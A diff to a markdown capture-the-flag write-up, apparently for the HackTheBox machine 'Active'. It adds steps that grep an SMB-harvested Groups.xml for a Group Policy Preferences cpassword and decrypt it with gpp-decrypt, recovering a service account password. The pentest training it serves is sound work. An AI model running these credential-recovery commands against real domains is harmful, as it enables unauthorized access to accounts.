@@ -44,7 +44,7 @@ AD is confirmed, I choose to enumerate SMB with NetExec for any open shares.
 
 SMB shows a readable share called Replication. I use `smbclient` to pull the share.
 
-```
+```console
 mkdir -p Replication && cd Replication
 smbclient //10.129.18.74/Replication -N -I 10.129.18.74 -c "recurse; prompt; mget *"
 ```
@@ -57,4 +57,14 @@ Quickly inspect what was pulled down.
 
 ![](/assets/img/htb/Active/active04.png)
 
+Inside is a Groups.xml file — a classic GPP artifact known to store recoverable credentials. 
 
+`grep -i cpassword Groups.xml`
+
+![](/assets/img/htb/Active/active065.png)
+
+Decrypt the embedded cpassword to recover the service account password
+
+`gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`
+
+![](/assets/img/htb/Active/active06.png)
